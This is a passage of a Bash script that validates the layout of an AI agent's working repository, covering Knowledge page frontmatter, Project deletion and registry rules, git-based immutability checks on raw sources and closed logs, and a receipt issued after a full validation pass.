  summary="$(frontmatter_value "$page" 'summary')"
  status="$(frontmatter_value "$page" 'status')"
  aliases="$(frontmatter_value "$page" 'aliases')"
  superseded_by="$(frontmatter_value "$page" 'superseded_by')"
  review_after="$(frontmatter_value "$page" 'review_after')"
  filename="${page##*/}"

  [[ -n "$summary" ]] || fail "$(relative_path "$page") has a missing summary"
  [[ -n "$aliases" ]] || fail "$(relative_path "$page") has missing aliases"
  if [[ "$summary" == *$'\t'* || $(value_character_count "$summary") -gt 200 ]]; then
    fail "$(relative_path "$page") summary must be tab-free and at most 200 characters"
  fi
  [[ "$aliases" != *$'\t'* ]] || fail "$(relative_path "$page") aliases must not contain tabs"
  case "$status" in active|superseded|archived|retired) ;; *) fail "$(relative_path "$page") has an invalid status" ;; esac
  if [[ "$status" == 'superseded' ]]; then
    [[ -n "$superseded_by" ]] || fail "$(relative_path "$page") superseded Knowledge requires superseded_by"
    scope_root="$(scope_root_for "$page")"
    if [[ "$superseded_by" == "$(relative_path "$page")" ]]; then
      fail "$(relative_path "$page") must not supersede itself"
    elif [[ ! -f "$scope_root/$superseded_by" ]]; then
      fail "$(relative_path "$page") superseded_by target is missing: $superseded_by"
    else
      target_status="$(frontmatter_value "$scope_root/$superseded_by" 'status')"
      [[ "$target_status" == 'active' ]] || fail "$(relative_path "$page") superseded_by target must be active"
    fi
  elif [[ -n "$superseded_by" ]]; then
    fail "$(relative_path "$page") may use superseded_by only with status: superseded"
  fi
  if [[ -n "$review_after" && ! "$review_after" =~ ^[0-9]{4}-[0-9]{2}-[0-9]{2}$ ]]; then
    fail "$(relative_path "$page") has invalid review_after"
  fi
  bytes="$(wc -c < "$page" | tr -d ' ')"
  if (( bytes > 65536 )); then
    fail "$(relative_path "$page") exceeds 64KiB Wiki hard limit"
  elif [[ "$status" == 'active' && $bytes -gt 24576 ]] && ! grep -Fqx '## Retrieval Map' "$page"; then
    fail "$(relative_path "$page") exceeds 24KiB and requires ## Retrieval Map"
  fi
  # Only the two fixed template paths may use uppercase names; do not extend this to user Knowledge.
  case "$(relative_path "$page")" in
    "$knowledge_source_template_path"|"$knowledge_topic_template_path") ;;
    *)
      case "$filename" in
        # Use POSIX character classes. In non-C locales the [a-z] collation order may include
        # uppercase letters, so the range form would miss uppercase filenames.
        *[![:lower:][:digit:].-]*) fail "$(relative_path "$page") filename must use lowercase kebab-case" ;;
      esac
      ;;
  esac
  validate_declared_references "$page"
}

validate_deleted_project() {
  local base="$1"
  local project_file="$2"
  local project_dir contract_copy status deletion_approved artifacts_retained_at output_files inbound_refs
  project_dir="${project_file%/PROJECT.md}"

  case "$project_dir" in
    projects/_template|projects/_archive)
      fail "protected Project structure must not be deleted: $project_dir"
      return
      ;;
  esac

  contract_copy="$(mktemp "$cache_test_dir/deleted-project.XXXXXX")"
  if ! git -C "$repo_root" show "$base:$project_file" > "$contract_copy" 2>/dev/null; then
    fail "cannot inspect deleted Project contract at $base:$project_file"
    return
  fi
  status="$(frontmatter_value "$contract_copy" 'status')"
  deletion_approved="$(frontmatter_value "$contract_copy" 'deletion_approved')"
  artifacts_retained_at="$(frontmatter_value "$contract_copy" 'artifacts_retained_at')"

  [[ "$status" == 'retired' ]] || fail "deleted Project was not retired in $base: $project_dir"
  [[ "$deletion_approved" == 'true' ]] || \
    fail "deleted Project lacks deletion_approved: true in $base: $project_dir"
  if [[ -z "$artifacts_retained_at" ]]; then
    fail "deleted Project lacks artifacts_retained_at in $base: $project_dir"
  elif [[ "$artifacts_retained_at" == 'none' ]]; then
    output_files="$(git -C "$repo_root" ls-tree -r --name-only "$base" -- "$project_dir/outputs" || true)"
    [[ -z "$output_files" ]] || \
      fail "deleted Project declares artifacts_retained_at: none but had tracked outputs: $project_dir"
  else
    case "$artifacts_retained_at" in
      /*|../*|*/../*|"$project_dir"/*)
        fail "deleted Project artifacts_retained_at must be a surviving repository-relative path: $artifacts_retained_at"
        ;;
      *)
        [[ -e "$repo_root/$artifacts_retained_at" ]] || \
          fail "deleted Project artifact retention target is missing: $artifacts_retained_at"
        if ! git -C "$repo_root" ls-files --error-unmatch -- "$artifacts_retained_at" >/dev/null 2>&1; then
          fail "deleted Project artifact retention target is not tracked or staged: $artifacts_retained_at"
        fi
        ;;
    esac
  fi

  [[ ! -e "$repo_root/$project_dir" ]] || fail "Project deletion left files behind: $project_dir"
  if command -v rg >/dev/null 2>&1; then
    inbound_refs="$(rg -l -F --hidden --glob '!.git/**' --glob '!.agent-cache/**' --glob '!.tmp/**' \
      "$project_dir/" "$repo_root" 2>/dev/null || true)"
  else
    inbound_refs="$(grep -RIlF --exclude-dir=.git --exclude-dir=.agent-cache --exclude-dir=.tmp \
      "$project_dir/" "$repo_root" 2>/dev/null || true)"
  fi
  [[ -z "$inbound_refs" ]] || fail "deleted Project still has inbound reference(s): $project_dir"
}

registry_path='projects/REPOSITORIES.md'
ignore_path='projects/.gitignore'

# Project roots of registered Independent Projects are excluded from the root validator scan.
# Keep the arrays permanently non-empty with a harmless entry duplicating the existing prune, so they are safe under set -u.
independent_names=()
independent_urls=()
independent_reasons=()
independent_revisions=()
if [[ -f "$repo_root/$registry_path" ]]; then
  while IFS=$'\t' read -r registry_kind registry_a registry_b registry_c registry_d; do
    [[ "$registry_kind" == 'R' ]] || continue
    independent_names+=("$registry_a")
    independent_urls+=("$registry_b")
    independent_reasons+=("$registry_c")
    independent_revisions+=("$registry_d")
  done < <(registry_records "$repo_root/$registry_path")
fi
independent_count="${#independent_names[@]}"

repository_prune=( -path "$repo_root/.git" )
repository_prune_or=( -o -path "$repo_root/.git" )
prune_index=0
while (( prune_index < independent_count )); do
  declared_root="$repo_root/projects/${independent_names[$prune_index]}"
  prune_index=$((prune_index + 1))
  [[ -d "$declared_root" ]] || continue
  repository_prune+=( -o -path "$declared_root" )
  repository_prune_or+=( -o -path "$declared_root" )
done

is_registered_independent() {
  local candidate="$1"
  local index=0
  while (( index < independent_count )); do
    [[ "${independent_names[$index]}" != "$candidate" ]] || return 0
    index=$((index + 1))
  done
  return 1
}

validate_knowledge_index_and_log() {
  local index_items log_records log_file filename
  # Existence of these canon files is enforced by required_files in the full static
  # run; a scoped fixture root may legitimately lack them.
  if [[ -f "$knowledge_index_file" ]]; then
    index_items="$(grep -Ec '^- ' "$knowledge_index_file" || true)"
    (( index_items <= 50 )) || fail "$knowledge_index_path has more than 50 route-map items"
    if grep -Eq '^- .*knowledge/raw/|^## raw/' "$knowledge_index_file"; then
      fail "$knowledge_index_path must not register knowledge/raw/ as an itemized global ledger"
    fi
  fi

  if [[ -f "$knowledge_log_file" ]]; then
    log_records="$(grep -Ec '^[0-9]{4}-[0-9]{2}-[0-9]{2}[[:space:]]+' "$knowledge_log_file" || true)"
    (( log_records <= 1000 )) || fail "$knowledge_log_path has more than 1,000 records and must rotate"
  fi
  if [[ -d "$repo_root/knowledge/wiki/logs" ]]; then
    while IFS= read -r -d '' log_file; do
      filename="${log_file##*/}"
      [[ "$filename" == '.gitkeep' ]] && continue
      if [[ ! "$filename" =~ ^[0-9]{4}-Q[1-4](-[0-9]{2,})?\.md$ ]]; then
        fail "$(relative_path "$log_file") has an invalid closed-log filename"
      fi
    done < <(find "$repo_root/knowledge/wiki/logs" -type f -print0)
  fi
}

# Git-boundary epilogue shared by the scoped (--changed) and full static runs:
# forbidden tracked paths, and the --base immutability / physical-move diff checks.
run_git_boundary_checks() {
  local git_root tracked_file status old_path new_path
  if git_root="$(git -C "$repo_root" rev-parse --show-toplevel 2>/dev/null)" && [[ "$git_root" == "$repo_root" ]]; then
    while IFS= read -r tracked_file; do
      case "$tracked_file" in
        .tmp/*|*/.tmp/*|.agent-cache/*|*/.agent-cache/*|.env*|*/.env*|.DS_Store|*/.DS_Store)
          if [[ "$tracked_file" != '.env.example' && "$tracked_file" != */.env.example ]]; then
            fail "forbidden tracked file: $tracked_file"
          fi
          ;;
      esac
    done < <(git -C "$repo_root" ls-files)

    if [[ -n "$base_ref" ]]; then
      if ! git -C "$repo_root" rev-parse --verify "$base_ref^{commit}" >/dev/null 2>&1; then
        fail "base ref does not resolve to a commit: $base_ref"
      else
        while IFS=$'\t' read -r status old_path new_path; do
          [[ -n "$status" ]] || continue
          case "$status" in
            A) ;;
            *) fail "immutable source changed relative to $base_ref: $status $old_path ${new_path:-}" ;;
          esac
        done < <(git -C "$repo_root" diff --name-status "$base_ref" -- knowledge/raw)
        while IFS=$'\t' read -r status old_path new_path; do
          [[ -n "$status" ]] || continue
          case "$status" in
            A) ;;
            *) fail "closed Knowledge log changed relative to $base_ref: $status $old_path ${new_path:-}" ;;
          esac
        done < <(git -C "$repo_root" diff --name-status "$base_ref" -- knowledge/wiki/logs)
        while IFS=$'\t' read -r status old_path new_path; do
          case "$status" in
            R*) fail "Project physical rename requires an approved migration map: $old_path -> $new_path" ;;
            D)
              case "$old_path" in
                projects/*/PROJECT.md) validate_deleted_project "$base_ref" "$old_path" ;;
              esac
              ;;
          esac
        done < <(git -C "$repo_root" diff --name-status "$base_ref" -- projects)
      fi
    fi
  else
    printf 'SKIP: Git tracking and base-diff checks (directory is not a repository root)\n'
  fi
}

finish_run() {
  if (( failures > 0 )); then
    printf 'FAILED: %d structural issue(s), %d warning(s)\n' "$failures" "$warnings" >&2
    exit 1
  fi
  # --full PASSはguarded / contract commitのための一回限りのreceiptを発行する。
  # receiptは現在のindex tree（git write-tree）へ束縛され、pre-commit hookが消費する
  # （正本はtools/CONTROL.md#明示エスカレーション）。
  if [[ "${full:-false}" == true && -z "${AGENT_VALIDATOR_NESTED_FIXTURE:-}" ]]; then
    if [[ "$(git -C "$repo_root" rev-parse --show-toplevel 2>/dev/null)" == "$repo_root" ]]; then
      receipt_dir="$(git -C "$repo_root" rev-parse --git-path agent-control)"
      case "$receipt_dir" in /*) ;; *) receipt_dir="$repo_root/$receipt_dir" ;; esac
      if receipt_tree="$(git -C "$repo_root" write-tree 2>/dev/null)"; then
        mkdir -p "$receipt_dir/receipts"
        printf 'head=%s\nissued=%s\n' \
          "$(git -C "$repo_root" rev-parse HEAD 2>/dev/null || printf 'none')" \
          "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" > "$receipt_dir/receipts/$receipt_tree"
        printf 'RECEIPT: full-validation receipt issued for index tree %s\n' "$receipt_tree"
      fi
    fi
  fi
  printf 'PASS: agent-directory structure is valid (%d warning(s))\n' "$warnings"
  exit 0
}

# --- scoped (--changed) validation ---------------------------------------------
# The changed set decides the validation scope: normal work on a Project, a Knowledge
# page, or a Skill validates only those targets plus the Git-boundary epilogue.
# Any change touching meta canon (tools, evals, routines, area canon files, templates,
# the registry, or the ignore projection) falls back safely to the full static run.

if [[ "$changed" == true && "$full" != true ]]; then
  if ! git -C "$repo_root" rev-parse --show-toplevel >/dev/null 2>&1; then
    printf 'NOTE: --changed requires a Git repository; running the full static validation\n' >&2
    changed=false
  fi
fi
if [[ "$changed" == true && "$full" != true ]]; then
  # Without an explicit --base, uncommitted work is judged against HEAD so the
  # immutability diffs (knowledge/raw, closed logs, project moves) always run in
  # the shared epilogue. An explicit --base <start-sha> covers start SHA -> working tree.
  [[ -n "$base_ref" ]] || base_ref='HEAD'
  changed_list="$(
    {
      [[ -z "$base_ref" ]] || git -C "$repo_root" diff --name-only "$base_ref" HEAD -- 2>/dev/null
      git -C "$repo_root" diff --name-only HEAD -- 2>/dev/null
      git -C "$repo_root" ls-files --others --exclude-standard 2>/dev/null
    } | LC_ALL=C sort -u
  )"

  scope_supported=true
  scoped_projects=''
  scoped_skills=''
  scoped_pages=''
  scoped_index_log=false
  while IFS= read -r changed_path; do
    [[ -n "$changed_path" ]] || continue
    case "$changed_path" in
      projects/_template/*|projects/AGENTS.md|projects/CLAUDE.md|projects/PROJECTS.md|\
projects/LIFECYCLE.md|projects/RECOVERY.md|projects/REPOSITORIES.md|projects/.gitignore)
        scope_supported=false; break ;;
      projects/*/*)
        scoped_name="${changed_path#projects/}"
        scoped_name="${scoped_name%%/*}"
        if is_registered_independent "$scoped_name" || [[ ! -d "$repo_root/projects/$scoped_name" ]]; then
          scope_supported=false; break
        fi
        printf '%s\n' "$scoped_projects" | grep -Fqx -- "$scoped_name" || \
          scoped_projects="${scoped_projects}${scoped_name}
"
        ;;
      knowledge/KNOWLEDGE.md|knowledge/wiki/_template/*)
        scope_supported=false; break ;;
      knowledge/raw/*)
        # Additions to immutable source material carry no static schema; modification
        # and deletion are refused by the --base diff in the shared epilogue.
        ;;
      knowledge/wiki/INDEX.md|knowledge/wiki/LOG.md|knowledge/wiki/logs/*)
        scoped_index_log=true ;;
      knowledge/wiki/sources/*.md|knowledge/wiki/topics/*.md)
        if [[ -f "$repo_root/$changed_path" ]]; then
          printf '%s\n' "$scoped_pages" | grep -Fqx -- "$changed_path" || \
            scoped_pages="${scoped_pages}${changed_path}
"
        else
          # A deleted wiki page is never silently skipped: deletion is boundary work
          # (zero inbound references, non-active status, a retention or replacement
          # target, and explicit user approval) and cannot pass as normal work.
          fail "$changed_path was deleted; deleting a Knowledge page is boundary work under the deletion contract, not normal --changed work"
        fi
        ;;
      skills/SKILLS.md|skills/_template/*)
        scope_supported=false; break ;;
      skills/*/*)
        scoped_name="${changed_path#skills/}"
        scoped_name="${scoped_name%%/*}"
        if [[ ! -f "$repo_root/skills/$scoped_name/SKILL.md" ]]; then
          scope_supported=false; break
        fi
        printf '%s\n' "$scoped_skills" | grep -Fqx -- "$scoped_name" || \
          scoped_skills="${scoped_skills}${scoped_name}
"
        ;;
      *)
        scope_supported=false; break ;;
    esac
  done <<< "$changed_list"

  if [[ "$scope_supported" == true ]]; then
    while IFS= read -r scoped_name; do
      [[ -n "$scoped_name" ]] || continue
      scoped_dir="$repo_root/projects/$scoped_name"
      validate_project_contract "$scoped_dir/PROJECT.md"
      validate_project_state "$scoped_dir/STATE.md"
      validate_project_docs "$scoped_dir"
      if [[ -f "$scoped_dir/AGENTS.md" ]]; then
        validate_project_agents_file "$scoped_dir/AGENTS.md"
      elif [[ -f "$scoped_dir/CLAUDE.md" ]]; then
        fail "projects/$scoped_name/CLAUDE.md exists without a sibling AGENTS.md to import"
      fi
    done <<< "$scoped_projects"
    while IFS= read -r changed_path; do
      [[ -n "$changed_path" ]] || continue
      validate_knowledge_page "$repo_root/$changed_path"
    done <<< "$scoped_pages"
    while IFS= read -r scoped_name; do
      [[ -n "$scoped_name" ]] || continue
      validate_skill "$repo_root/skills/$scoped_name/SKILL.md"
    done <<< "$scoped_skills"
    [[ "$scoped_index_log" != true ]] || validate_knowledge_index_and_log
    printf 'NOTE: scoped validation (--changed) covered %s changed path(s)\n' \
      "$(printf '%s\n' "$changed_list" | grep -c . || true)" >&2
    run_git_boundary_checks
    finish_run
  fi
  printf 'NOTE: the changed set reaches meta canon or an unscopeable path; running the full static validation\n' >&2
fi

required_files=(
  'AGENTS.md' 'CLAUDE.md' 'projects/AGENTS.md' 'projects/CLAUDE.md'
  'README.md' 'knowledge/KNOWLEDGE.md' "$knowledge_index_path" "$knowledge_log_path"
  'skills/SKILLS.md' 'skills/_template/SKILL.md' 'projects/PROJECTS.md' 'projects/LIFECYCLE.md' 'projects/RECOVERY.md'
  "$registry_path" "$ignore_path"
  'projects/_template/PROJECT.md' 'projects/_template/STATE.md' 'evals/EVALS.md' 'tools/TOOLS.md'
  'tools/BACKUP.md' 'tools/build-context-cache.sh' 'tools/find-context.sh' 'tools/prepare-context.sh'
  'tools/append-knowledge-log.sh' 'tools/backup-to-github.sh' 'tools/validate-agent-directory.sh'
  'tools/materialize-project-repositories.sh' 'tools/finalize-task.sh' '.gitignore'
  'tools/UPSTREAM.md' 'tools/report-upstream-issue.sh' 'tools/REFERENCE.md'
  'routines/ROUTINES.md' 'routines/maintenance/ROUTINE.md'
  'tools/run-routine.sh' 'tools/manage-routine-schedule.sh' 'tools/routine-reasoner.py'
  "$knowledge_source_template_path" "$knowledge_topic_template_path"
)
for path in "${required_files[@]}"; do require_file "$repo_root/$path"; done

# Immutable source material has exactly two areas, internal/external, both protected with the same strength.
required_directories=(
  'knowledge/raw/internal' 'knowledge/raw/external' 'knowledge/wiki/sources' 'knowledge/wiki/topics'
)
for path in "${required_directories[@]}"; do
  [[ -d "$repo_root/$path" ]] || \
    fail "missing directory: $path (create it and keep it tracked, e.g. touch $path/.gitkeep)"
done

# Retire old structures and old entry points without keeping compatibility copies.
retired_paths=(
  'knowledge/research|external source material is owned by knowledge/raw/external/'
  'skills/README.md|the area canon is skills/SKILLS.md'
  'projects/README.md|the area canon is projects/PROJECTS.md'
  'evals/README.md|the area canon is evals/EVALS.md'
  'tools/README.md|the area canon is tools/TOOLS.md'
)
for entry in "${retired_paths[@]}"; do
  retired_path="${entry%%|*}"
  retired_hint="${entry#*|}"
  [[ ! -e "$repo_root/$retired_path" ]] || \
    fail "retired path must not exist: $retired_path — $retired_hint (git rm it; do not keep a compatibility copy)"
done

# Fixed Wiki Markdown is canonical only under uppercase names. On a case-insensitive filesystem -e
# also matches the uppercase canon, so detect the old case only via exact matches against the Git index and real directory entries.
tracked_files_snapshot=''
if git -C "$repo_root" rev-parse --show-toplevel >/dev/null 2>&1; then
  tracked_files_snapshot="$(git -C "$repo_root" ls-files 2>/dev/null || true)"
fi
for entry in \
  "knowledge/wiki/index.md|$knowledge_index_path" \
  "knowledge/wiki/log.md|$knowledge_log_path" \
  "knowledge/wiki/_template/source.md|$knowledge_source_template_path" \
  "knowledge/wiki/_template/topic.md|$knowledge_topic_template_path"; do
  retired_path="${entry%%|*}"
  canonical_path="${entry#*|}"
  if [[ -n "$tracked_files_snapshot" ]] && \
    printf '%s\n' "$tracked_files_snapshot" | grep -Fqx -- "$retired_path"; then
    fail "retired lowercase Knowledge path is tracked in the Git index: $retired_path — the canonical name is $canonical_path"
  fi
  # readdir returns the name as actually stored, so find's -name matches case-exactly.
  if [[ -d "$repo_root/${retired_path%/*}" ]] && \
    [[ -n "$(find "$repo_root/${retired_path%/*}" -maxdepth 1 -type f -name "${retired_path##*/}" -print -quit)" ]]; then
    fail "retired lowercase Knowledge file exists on disk: $retired_path — the canonical name is $canonical_path"
  fi
done

# Project docs are entered through an uppercase Domain Canon. External source material and inputs naming are exempt.
while IFS= read -r -d '' docs_readme; do
  fail "$(relative_path "$docs_readme") is forbidden; enter docs/ through an uppercase Domain Canon such as docs/DESIGN.md"
done < <(find "$repo_root" \
  \( -type d \( -name '.git' -o -name '.agent-cache' -o -name '.tmp' -o -name 'inputs' \) \
     -o -path "$repo_root/knowledge/raw" "${repository_prune_or[@]}" \) -prune -o \
  -type f -path '*/projects/*/docs/README.md' -print0)

# Do not permanently ship docs/, ARCHITECTURE.md, or AGENTS.md in the Project template.
for template_entry in AGENTS.md CLAUDE.md ARCHITECTURE.md docs; do
  [[ ! -e "$repo_root/projects/_template/$template_entry" ]] || \
    fail "projects/_template must not ship $template_entry; only the Project that needs it creates it"
done

check_size "$repo_root/AGENTS.md" 8192 'root AGENTS.md'
check_size_warning "$repo_root/AGENTS.md" 6144 'root AGENTS.md router'
check_size "$repo_root/projects/AGENTS.md" 2048 'projects AGENTS.md'
check_size "$repo_root/README.md" 32768 'README.md'
check_size "$repo_root/knowledge/KNOWLEDGE.md" 20480 'KNOWLEDGE.md'
check_size "$repo_root/skills/SKILLS.md" 12288 'skills SKILLS.md'
check_size "$repo_root/projects/PROJECTS.md" 24576 'projects PROJECTS.md'
check_size "$repo_root/evals/EVALS.md" 24576 'evals EVALS.md'
check_size "$repo_root/tools/TOOLS.md" 20480 'tools TOOLS.md'
check_size "$repo_root/tools/BACKUP.md" 20480 'tools BACKUP.md'
check_size "$repo_root/tools/CONTROL.md" 20480 'tools CONTROL.md'
check_size "$repo_root/tools/UPSTREAM.md" 20480 'tools UPSTREAM.md'
check_size "$repo_root/tools/REFERENCE.md" 20480 'tools REFERENCE.md'
check_size "$knowledge_index_file" 8192 'Knowledge index'
check_size "$knowledge_log_file" 131072 'Knowledge log'
check_size "$repo_root/routines/ROUTINES.md" 16384 'routines ROUTINES.md'
while IFS= read -r -d '' routine_contract; do
  check_size "$routine_contract" 8192 'ROUTINE.md'
done < <(find "$repo_root/routines" -mindepth 2 -maxdepth 2 -type f -name 'ROUTINE.md' -print0 2>/dev/null)
check_heading_warning "$repo_root/AGENTS.md" 20
check_heading_warning "$repo_root/knowledge/KNOWLEDGE.md" 30
check_heading_warning "$repo_root/skills/SKILLS.md" 30
check_heading_warning "$repo_root/projects/PROJECTS.md" 30

if [[ "$strict" == true ]]; then
  if grep -Eq '<agent-name>|<agent-role>|<agent-mission>|<agent-vision>|<operator-language>|<project-dir>' "$repo_root/AGENTS.md"; then
    fail 'AGENTS.md contains unresolved agent definition placeholders'
  elif [[ -f "$repo_root/tools/report-upstream-issue.sh" ]]; then
    # A deployed tree must declare at least one backticked real name on the identity line;
    # an unbackticked name would leave the agent-name rule with nothing to check (leak side).
    # The report tool owns the extraction predicate, so probe it instead of duplicating the parser.
    strict_probe_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-strict-probe.XXXXXX")"
    cleanup_paths+=("$strict_probe_dir")
    printf 'strict self-definition probe body\n' > "$strict_probe_dir/body.md"
    set +e
    strict_probe_output="$(AGENT_CACHE_DIR="$strict_probe_dir" \
      bash "$repo_root/tools/report-upstream-issue.sh" \
      --title '[bug] strict self-definition probe' --body-file "$strict_probe_dir/body.md" --dry-run 2>&1)"
    set -e
    if printf '%s\n' "$strict_probe_output" | grep -Fq 'reason=anonymization-source-unparsed'; then
      fail 'AGENTS.md#自己定義 identity line declares no backticked agent name; the anonymization check has nothing to run on (tools/UPSTREAM.md#公開禁止情報)'
    fi
  fi
  while IFS= read -r -d '' case_file; do
    if grep -Fq '<skill-name>' "$case_file"; then
      fail "$(relative_path "$case_file") contains an unresolved Skill placeholder"
    fi
  done < <(find "$repo_root/evals/cases" -type f -name '*.yaml' -print0)
fi

if [[ -d "$repo_root/projects/_archive" ]]; then
  fail 'projects/_archive is forbidden; use Project status without physical moves'
fi

# The root is both bootloader and router; it holds the Route table and entry files as references that must exist.
validate_claude_bridge "$repo_root/AGENTS.md"
validate_claude_bridge "$repo_root/projects/AGENTS.md"
if [[ -f "$repo_root/AGENTS.md" ]]; then
  for route_token in knowledge skill project meta none; do
    grep -Eq "^\| *\`$route_token\` *\|" "$repo_root/AGENTS.md" || \
      fail "AGENTS.md is missing the Route table row for: $route_token"
  done
  for route_entry in knowledge/KNOWLEDGE.md skills/SKILLS.md projects/AGENTS.md; do
    grep -Fq "$route_entry" "$repo_root/AGENTS.md" || \
      fail "AGENTS.md does not name the Route entry file: $route_entry"
  done
  while IFS= read -r referenced_path; do
    [[ -n "$referenced_path" ]] || continue
    case "$referenced_path" in */*) ;; *) continue ;; esac
    [[ -e "$repo_root/$referenced_path" ]] || \
      fail "AGENTS.md references a missing entry file: $referenced_path"
  done < <(grep -Eo '`[a-z][a-zA-Z0-9_./-]+\.(md|sh)`' "$repo_root/AGENTS.md" | tr -d '`' | LC_ALL=C sort -u)
fi
if [[ -f "$repo_root/projects/AGENTS.md" ]]; then
  for project_entry in PROJECT.md STATE.md projects/PROJECTS.md; do
    grep -Fq "$project_entry" "$repo_root/projects/AGENTS.md" || \
      fail "projects/AGENTS.md does not delegate to: $project_entry"
  done
fi

# A per-Project AGENTS.md is optional; validate it as a delta file only when it exists.
while IFS= read -r -d '' project_agents_file; do
  [[ -f "$(dirname "$project_agents_file")/PROJECT.md" ]] || continue
  validate_project_agents_file "$project_agents_file"
done < <(find "$repo_root/projects" "$repo_root/evals/fixtures" \
  \( "${repository_prune[@]}" \) -prune -o -type f -name 'AGENTS.md' -print0)

while IFS= read -r -d '' orphan_claude_file; do
  [[ -f "$(dirname "$orphan_claude_file")/PROJECT.md" ]] || continue
  [[ -f "$(dirname "$orphan_claude_file")/AGENTS.md" ]] || \
    fail "$(relative_path "$orphan_claude_file") exists without a sibling AGENTS.md to import"
done < <(find "$repo_root/projects" "$repo_root/evals/fixtures" \
  \( "${repository_prune[@]}" \) -prune -o -type f -name 'CLAUDE.md' -print0)

while IFS= read -r -d '' nested_git; do
  fail "nested Git repository is forbidden unless it is a registered Independent Project clone: $(relative_path "$nested_git")"
done < <(find "$repo_root" \( "${repository_prune[@]}" \) -prune -o \
  -mindepth 2 \( -type d -o -type f \) -name .git -print0)

# --- Registry and ignore projection checks------------------------------------------

# Static fixtures carry no real clone, so attachment and root ownership are checked only for the root registry.
validate_repositories_registry() {
  local scope_root="$1"
  local scope_is_root="$2"
  local scope_registry="$scope_root/$registry_path"
  local scope_ignore="$scope_root/$ignore_path"
  local rel_registry rel_ignore record_kind entry_name entry_url entry_reason entry_revision
  local ignore_entry ignore_name previous_ignore tracked_entry
  local names_file ignore_file

  [[ -f "$scope_registry" ]] || return 0
  rel_registry="$(relative_path "$scope_registry")"
  rel_ignore="$(relative_path "$scope_ignore")"
  names_file="$(mktemp "${TMPDIR:-/tmp}/agent-registry-names.XXXXXX")"
  ignore_file="$(mktemp "${TMPDIR:-/tmp}/agent-registry-ignore.XXXXXX")"
  # Register so the EXIT trap can reclaim them even when set -e aborts; the happy-path rm stays as-is.
  cleanup_paths+=("$names_file" "$ignore_file")

  grep -Fqx '# REPOSITORIES — Independent Project Registry' "$scope_registry" || \
    fail "$rel_registry must open with the fixed heading: # REPOSITORIES — Independent Project Registry"

  while IFS=$'\t' read -r record_kind entry_name entry_url entry_reason entry_revision; do
    [[ -n "$record_kind" ]] || continue
    if [[ "$record_kind" == 'E' ]]; then
      fail "$rel_registry: $entry_name"
      continue
    fi
    printf '%s\n' "$entry_name" >> "$names_file"
    case "$entry_reason" in
      automation|distribution|collaboration|access|identity|upstream|retention) ;;
      *) fail "$rel_registry entry \`$entry_name\` has an invalid repository_reason: ${entry_reason:-<empty>}" ;;
    esac
    if repository_url_is_rejected "$entry_url"; then
      fail "$rel_registry entry \`$entry_name\` repository_url must be a credential-free remote URL without query, fragment or local path"
    fi
    [[ "$entry_revision" =~ ^[0-9a-f]{40}$ ]] || \
      fail "$rel_registry entry \`$entry_name\` revision must be a 40-character lowercase commit SHA"
    [[ -d "$scope_root/projects/$entry_name" ]] || \
      fail "$rel_registry entry \`$entry_name\` has no matching Project root at projects/$entry_name/"
    if [[ "$scope_is_root" == true ]]; then
      validate_independent_attachment "$entry_name" "$entry_url" "$entry_revision"
      if [[ -n "$tracked_files_snapshot" ]]; then
        while IFS= read -r tracked_entry; do
          [[ -n "$tracked_entry" ]] || continue
          fail "the root repository must not track Independent Project contents: $tracked_entry"
        done < <(printf '%s\n' "$tracked_files_snapshot" | grep -E "^projects/${entry_name//./\\.}/" | head -n 5 || true)
      fi
    fi
  done < <(registry_records "$scope_registry")

  # The managed block is a derived projection of the registry; its set and order must match exactly.
  previous_ignore=''
  while IFS=$'\t' read -r record_kind ignore_entry; do
    [[ -n "$record_kind" ]] || continue
    if [[ "$record_kind" == 'E' ]]; then
      fail "$rel_ignore: $ignore_entry"
      continue
    fi
    if [[ ! "$ignore_entry" =~ ^/[A-Za-z0-9][A-Za-z0-9._-]*/$ ]]; then
      fail "$rel_ignore managed block entries must use the /<name>/ form: $ignore_entry"
      continue
    fi
    ignore_name="${ignore_entry#/}"
    ignore_name="${ignore_name%/}"
    printf '%s\n' "$ignore_name" >> "$ignore_file"
    if [[ -n "$previous_ignore" ]] && \
      [[ "$(printf '%s\n%s\n' "$previous_ignore" "$ignore_name" | LC_ALL=C sort | head -n 1)" != "$previous_ignore" ]]; then
      fail "$rel_ignore managed block must sort ascending: $previous_ignore before $ignore_name"
    fi
    previous_ignore="$ignore_name"
  done < <(ignore_block_records "$scope_ignore")

  if ! cmp -s "$names_file" "$ignore_file"; then
    fail "$rel_ignore managed block must match the $rel_registry entry set exactly (registry is canonical, the ignore block is derived)"
  fi
  rm -f "$names_file" "$ignore_file"
}

validate_repositories_registry "$repo_root" true
while IFS= read -r -d '' fixture_registry; do
  validate_repositories_registry "$(dirname "$(dirname "$fixture_registry")")" false
done < <(find "$repo_root/evals/fixtures" -mindepth 3 -maxdepth 3 -type f \
  -path '*/projects/REPOSITORIES.md' -print0 2>/dev/null)

# The root Git does not track registered Project roots and holds no gitlinks or submodules.
if grep -Fqx 'projects/*/repository/' "$repo_root/.gitignore"; then
  fail 'root .gitignore still ignores the retired projects/*/repository/ layout; the registry projection lives in projects/.gitignore'
fi
while IFS= read -r broad_pattern; do
  [[ -n "$broad_pattern" ]] || continue
  fail "root .gitignore must not ignore Project directories wholesale: $broad_pattern"
done < <(grep -E '^/?projects/\*/?$' "$repo_root/.gitignore" || true)
while IFS= read -r broad_pattern; do
  [[ -n "$broad_pattern" ]] || continue
  fail "$ignore_path must not ignore Project directories wholesale: $broad_pattern"
done < <(grep -E '^/?\*/?$' "$repo_root/$ignore_path" || true)

# Never ignore Embedded Projects, _template, the registry, or the projection.
if command -v git >/dev/null 2>&1 && git -C "$repo_root" rev-parse --show-toplevel >/dev/null 2>&1; then
  for guarded_path in "$registry_path" "$ignore_path" 'projects/_template/PROJECT.md' 'projects/PROJECTS.md'; do
    if git -C "$repo_root" check-ignore -q -- "$guarded_path" 2>/dev/null; then
      fail "$guarded_path must never be ignored by the root repository"
    fi
  done
  for embedded_contract in "$repo_root"/projects/*/PROJECT.md; do
    [[ -f "$embedded_contract" ]] || continue
    embedded_name="$(basename "$(dirname "$embedded_contract")")"
    is_registered_independent "$embedded_name" && continue
    if git -C "$repo_root" check-ignore -q -- "projects/$embedded_name/PROJECT.md" 2>/dev/null; then
      fail "Embedded Project projects/$embedded_name/ must not be ignored by the root repository"
    fi
  done
fi

if [[ -n "$tracked_files_snapshot" ]]; then
  while IFS= read -r tracked_child; do
    [[ -n "$tracked_child" ]] || continue
